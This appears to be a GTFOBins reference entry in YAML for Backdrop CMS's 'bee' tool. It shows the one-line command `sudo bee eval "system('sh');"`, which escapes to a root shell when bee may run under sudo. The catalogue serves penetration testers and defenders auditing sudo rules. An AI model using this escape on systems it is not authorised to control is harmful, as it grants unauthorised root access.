---
functions:
  sudo:
    - description: For this to work [`bee`](/gtfobins/bee/) must be excuted from the Backdrop CMS root directory (e.g. `/var/www/html`).
      code: |
        sudo bee eval "system('sh');"
---
